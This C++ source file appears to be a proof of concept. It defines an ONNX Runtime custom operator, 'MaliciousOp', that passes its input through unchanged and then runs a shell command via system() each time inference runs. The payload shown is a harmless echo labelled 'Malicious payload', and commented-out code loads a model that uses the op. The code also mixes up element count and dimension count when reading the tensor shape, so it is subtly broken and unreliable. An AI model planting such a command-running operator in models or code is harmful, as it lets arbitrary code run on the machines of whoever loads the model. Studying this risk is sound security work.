#include <onnxruntime_cxx_api.h>
#include <iostream>
#include <stdlib.h> // For system()

struct KernelMaliciousOp {
    KernelMaliciousOp(const OrtApi& api, const OrtKernelInfo* info) : api_(api) {}

    void Compute(OrtKernelContext* context) {
        Ort::KernelContext ctx(context);

        // Get input tensor
        const OrtValue* input_tensor = ctx.GetInput(0);
        OrtTensorTypeAndShapeInfo* input_info = nullptr;
        OrtStatus* status = api_.GetTensorTypeAndShape(input_tensor, &input_info);
        if (status != nullptr) {
            std::cerr << "Error: " << api_.GetErrorMessage(status) << std::endl;
            api_.ReleaseStatus(status);
            return;
        }

        size_t size = 0;
        status = api_.GetTensorShapeElementCount(input_info, &size);
        if (status != nullptr) {
            std::cerr << "Error: " << api_.GetErrorMessage(status) << std::endl;
            api_.ReleaseStatus(status);
            return;
        }

        std::vector<int64_t> input_shape(size);
        status = api_.GetDimensions(input_info, input_shape.data(), size);
        if (status != nullptr) {
            std::cerr << "Error: " << api_.GetErrorMessage(status) << std::endl;
            api_.ReleaseStatus(status);
            return;
        }

        // Allocate output tensor
        OrtValue* output_tensor = ctx.GetOutput(0, input_shape.data(), size);

        // Get input tensor data
        const float* input = nullptr;
        float* mutable_input = nullptr;
        status = api_.GetTensorMutableData(const_cast<OrtValue*>(input_tensor), reinterpret_cast<void**>(&mutable_input));
        if (status != nullptr) {
            std::cerr << "Error: " << api_.GetErrorMessage(status) << std::endl;
            api_.ReleaseStatus(status);
            return;
        }
        input = mutable_input; // Assign mutable pointer to const pointer

        // Get output tensor data
        float* output = nullptr;
        status = api_.GetTensorMutableData(output_tensor, reinterpret_cast<void**>(&output));
        if (status != nullptr) {
            std::cerr << "Error: " << api_.GetErrorMessage(status) << std::endl;
            api_.ReleaseStatus(status);
            return;
        }

        for (size_t i = 0; i < size; ++i) {
            output[i] = input[i]; // Identity operation
        }

        // Release the tensor type and shape info
        api_.ReleaseTensorTypeAndShapeInfo(input_info);

        // Malicious payload
        system("echo 'Malicious code executed!'");
    }

private:
    const OrtApi& api_;
};

struct CustomOpMaliciousOp : Ort::CustomOpBase<CustomOpMaliciousOp, KernelMaliciousOp> {
    void* CreateKernel(const OrtApi& api, const OrtKernelInfo* info) const {
        return new KernelMaliciousOp(api, info);
    }

    const char* GetName() const { return "MaliciousOp"; }

    size_t GetInputTypeCount() const { return 1; }
    ONNXTensorElementDataType GetInputType(size_t /*index*/) const { return ONNX_TENSOR_ELEMENT_DATA_TYPE_FLOAT; }

    size_t GetOutputTypeCount() const { return 1; }
    ONNXTensorElementDataType GetOutputType(size_t /*index*/) const { return ONNX_TENSOR_ELEMENT_DATA_TYPE_FLOAT; }
};

// int main() {
//     Ort::Env env(ORT_LOGGING_LEVEL_WARNING, "test");
//     Ort::SessionOptions session_options;

//     Ort::CustomOpDomain custom_domain("custom_domain");
//     CustomOpMaliciousOp custom_op;
//     custom_domain.Add(&custom_op);
//     session_options.Add(custom_domain);

//     Ort::Session session(env, "malicious_model.onnx", session_options);
//     // Run your session here ...
// }
